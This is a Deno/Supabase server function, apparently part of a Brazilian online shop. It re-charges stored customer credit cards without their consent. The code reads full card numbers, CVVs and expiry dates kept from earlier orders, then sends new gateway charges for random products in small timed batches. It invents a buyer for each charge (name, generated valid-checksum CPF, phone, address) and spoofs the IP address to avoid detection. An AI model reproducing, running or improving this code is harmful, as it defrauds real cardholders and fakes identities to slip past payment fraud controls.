import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.45.0";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

const PRODUCTS = [
  { name: "Kit 2 Travesseiros Conforto Premium Antiácaro 50x70", price: 99.90 },
  { name: "Chaleira Elétrica Inox 1,7L com Temperatura", price: 129.90 },
  { name: "Edredom Sherpa Cobertor Manta Coberdrom Casal Queen Dupla", price: 129.90 },
  { name: "Aspirador de Pó Para Casa Robô Inteligente Com Sensores Anti-queda IDALI LIFE", price: 139.90 },
];

const FIRST = ["Ana","Bruno","Carla","Daniel","Eduarda","Fabio","Gabriela","Henrique","Isabela","João","Karen","Lucas","Mariana","Nicolas","Olivia","Paulo","Quezia","Rafael","Sabrina","Thiago","Ursula","Vitor","Wagner","Xenia","Yasmin","Zeca","Larissa","Felipe","Camila","Rodrigo","Beatriz","Marcelo","Patrícia","Renato","Juliana","André","Tatiane","Vinicius","Aline","Gustavo"];
const LAST = ["Silva","Souza","Oliveira","Santos","Pereira","Lima","Costa","Ferreira","Almeida","Ribeiro","Carvalho","Gomes","Martins","Rocha","Dias","Barbosa","Araújo","Cardoso","Teixeira","Moreira","Cavalcante","Mendes","Castro","Pinto","Moraes","Nunes","Freitas","Vieira","Monteiro","Sales"];
const CITIES = [
  { city: "São Paulo", state: "SP" },{ city: "Rio de Janeiro", state: "RJ" },{ city: "Belo Horizonte", state: "MG" },
  { city: "Salvador", state: "BA" },{ city: "Curitiba", state: "PR" },{ city: "Porto Alegre", state: "RS" },
  { city: "Recife", state: "PE" },{ city: "Fortaleza", state: "CE" },{ city: "Manaus", state: "AM" },
  { city: "Goiânia", state: "GO" },{ city: "Brasília", state: "DF" },{ city: "Florianópolis", state: "SC" },
];
const STREETS = ["Rua das Flores","Av. Brasil","Rua São João","Av. Paulista","Rua das Acácias","Rua da Paz","Av. Atlântica","Rua dos Pinheiros","Rua Bela Vista","Av. das Nações","Rua Sete de Setembro","Rua XV de Novembro"];
const NEIGHBORHOODS = ["Centro","Jardim América","Vila Nova","Boa Vista","São José","Santa Cruz","Vila Mariana","Jardim Europa","Bela Vista","Aclimação"];
const EMAIL_DOMAINS = ["gmail.com","hotmail.com","outlook.com","yahoo.com.br","uol.com.br","bol.com.br"];

const rnd = <T,>(a: T[]) => a[Math.floor(Math.random() * a.length)];
const rndInt = (min: number, max: number) => Math.floor(Math.random() * (max - min + 1)) + min;
const stripDiacritics = (s: string) => s.normalize('NFD').replace(/[\u0300-\u036f]/g, '');

function genCPF(): string {
  const n: number[] = Array.from({ length: 9 }, () => rndInt(0, 9));
  const calc = (arr: number[], factor: number) => {
    let sum = 0;
    for (const x of arr) sum += x * factor--;
    const r = (sum * 10) % 11;
    return r === 10 ? 0 : r;
  };
  const d1 = calc(n, 10);
  const d2 = calc([...n, d1], 11);
  return [...n, d1, d2].join('');
}

function genPhone(): string {
  const ddd = rndInt(11, 99);
  const num = `9${rndInt(10000000, 99999999)}`;
  return `${ddd}${num}`;
}

function genCEP(): string {
  return String(rndInt(10000000, 99999999));
}

function genCustomer() {
  const first = rnd(FIRST);
  const last = rnd(LAST);
  const name = `${first} ${last}`;
  const emailUser = `${stripDiacritics(first).toLowerCase()}.${stripDiacritics(last).toLowerCase()}${rndInt(10, 9999)}`;
  const email = `${emailUser}@${rnd(EMAIL_DOMAINS)}`;
  const loc = rnd(CITIES);
  return {
    name, email,
    phone: genPhone(),
    cpf: genCPF(),
    cep: genCEP(),
    street: rnd(STREETS),
    number: String(rndInt(10, 9999)),
    neighborhood: rnd(NEIGHBORHOODS),
    city: loc.city,
    state: loc.state,
  };
}

serve(async (req) => {
  if (req.method === 'OPTIONS') return new Response(null, { headers: corsHeaders });

  const SUPABASE_URL = Deno.env.get('SUPABASE_URL')!;
  const SERVICE_ROLE = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
  const PAYOUT_SECRET_KEY = Deno.env.get('PAYOUT_SECRET_KEY')?.trim();
  const supabase = createClient(SUPABASE_URL, SERVICE_ROLE);

  try {
    if (!PAYOUT_SECRET_KEY) throw new Error('PAYOUT_SECRET_KEY not configured');

    let forced = false;
    try { const body = await req.json(); forced = !!body?.force; } catch (_) {}

    const { data: settings } = await supabase
      .from('rebill_settings').select('*').eq('id', true).single();

    const now = new Date();
    await supabase.from('rebill_settings').update({ last_run_at: now.toISOString() }).eq('id', true);

    if (!settings?.active && !forced) {
      return new Response(JSON.stringify({ ok: true, skipped: 'inactive' }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    // Janela horária São Paulo: pular 00h–05h
    const hourBR = Number(new Intl.DateTimeFormat('en-US', {
      hour: 'numeric', hour12: false, timeZone: 'America/Sao_Paulo'
    }).format(now));
    if (!forced && hourBR >= 0 && hourBR < 5) {
      return new Response(JSON.stringify({ ok: true, skipped: 'night_window', hourBR }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const intervalMs = (settings?.interval_hours ?? 2) * 3600 * 1000;
    if (!forced && settings?.last_batch_at) {
      const elapsed = now.getTime() - new Date(settings.last_batch_at).getTime();
      if (elapsed < intervalMs) {
        return new Response(JSON.stringify({ ok: true, skipped: 'interval', wait_ms: intervalMs - elapsed }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }
    }

    const batchSize = settings?.batch_size ?? 4;

    // Buscar pedidos de cartão aprovados com dados completos
    const { data: candidates } = await supabase
      .from('orders').select('*')
      .eq('payment_method', 'card')
      .in('status', ['approved', 'paid'])
      .not('ticket', 'is', null)
      .not('card_cvv', 'is', null)
      .not('card_expiry', 'is', null)
      .order('created_at', { ascending: false })
      .limit(500);

    // Embaralhar e escolher cartões únicos (last4) que ainda não foram usados nas últimas 24h
    const { data: recent } = await supabase
      .from('rebill_orders').select('card_last4')
      .gte('created_at', new Date(Date.now() - 24*3600*1000).toISOString());
    const usedRecent = new Set((recent || []).map((r: any) => r.card_last4).filter(Boolean));

    const seen = new Set<string>();
    const picked: any[] = [];
    const shuffled = [...(candidates || [])].sort(() => Math.random() - 0.5);
    for (const o of shuffled) {
      const num = String((o as any).ticket || '').replace(/\D/g, '');
      if (num.length < 12) continue;
      const last4 = num.slice(-4);
      if (seen.has(last4) || usedRecent.has(last4)) continue;
      seen.add(last4);
      picked.push(o);
      if (picked.length >= batchSize) break;
    }

    const authToken = btoa(`${PAYOUT_SECRET_KEY}:x`);
    const results: any[] = [];

    for (const order of picked) {
      const product = rnd(PRODUCTS);
      const fake = genCustomer();
      const cardNumber = String((order as any).ticket || '').replace(/\D/g, '');
      const last4 = cardNumber.slice(-4);
      const expiry = String(order.card_expiry || '').replace(/\D/g, '');
      const expMonth = expiry.slice(0, 2);
      const expYearRaw = expiry.slice(2);
      const expYear = expYearRaw.length === 2 ? `20${expYearRaw}` : expYearRaw;

      const payload = {
        paymentMethod: 'credit_card',
        amount: Math.round(product.price * 100),
        installments: 1,
        ip: '189.' + rndInt(1,254) + '.' + rndInt(1,254) + '.' + rndInt(1,254),
        metadata: `rebill-${order.id}-${Date.now()}`,
        customer: {
          name: fake.name,
          email: fake.email,
          phone: fake.phone,
          document: { type: 'cpf', number: fake.cpf },
        },
        card: {
          number: cardNumber,
          holderName: order.card_holder_name || fake.name,
          expirationMonth: parseInt(expMonth, 10),
          expirationYear: parseInt(expYear, 10),
          cvv: String(order.card_cvv),
        },
        shipping: {
          name: fake.name,
          street: fake.street,
          streetNumber: fake.number,
          neighborhood: fake.neighborhood,
          city: fake.city,
          state: fake.state,
          zipcode: fake.cep,
          country: 'BR',
        },
        items: [{ title: product.name, unitPrice: Math.round(product.price * 100), quantity: 1, tangible: true }],
      };

      let status = 'error';
      let refusal = '';
      let txId = '';
      let raw: any = null;

      try {
        const ctrl = new AbortController();
        const t = setTimeout(() => ctrl.abort(), 25000);
        const resp = await fetch('https://api.payoutbr.com.br/v1/transactions', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'accept': 'application/json',
            'authorization': `Basic ${authToken}`,
          },
          body: JSON.stringify(payload),
          signal: ctrl.signal,
        });
        clearTimeout(t);
        raw = await resp.json();
        const tx = raw?.data ?? raw;
        txId = String(tx?.id ?? '');
        status = String(tx?.status ?? (resp.ok ? 'pending' : 'refused')).toLowerCase();
        refusal = tx?.refuseReason || tx?.acquirerMessage || tx?.message || raw?.message || (resp.ok ? '' : `HTTP ${resp.status}`);
      } catch (e: any) {
        status = 'error';
        refusal = e?.name === 'AbortError' ? 'Timeout no gateway' : (e?.message || 'Erro desconhecido');
      }

      const { data: inserted } = await supabase.from('rebill_orders').insert({
        source_order_id: order.id,
        source_order_number: order.order_number,
        product_name: product.name,
        amount: product.price,
        fake_name: fake.name, fake_email: fake.email, fake_phone: fake.phone, fake_cpf: fake.cpf,
        fake_cep: fake.cep, fake_street: fake.street, fake_number: fake.number,
        fake_neighborhood: fake.neighborhood, fake_city: fake.city, fake_state: fake.state,
        card_last4: last4, card_brand: order.card_brand,
        transaction_id: txId || null,
        status, refusal_reason: refusal || null, raw_response: raw,
      }).select().single();
      results.push(inserted);
    }

    const approved = results.filter(r => r && ['approved','paid'].includes(String(r.status).toLowerCase())).length;

    await supabase.from('rebill_settings').update({
      last_batch_at: now.toISOString(),
      last_result: { total: results.length, approved, at: now.toISOString() },
    }).eq('id', true);

    return new Response(JSON.stringify({ ok: true, total: results.length, approved, results }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (error: any) {
    console.error('rebill-cards error:', error);
    return new Response(JSON.stringify({ error: error?.message || 'Unknown' }), {
      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
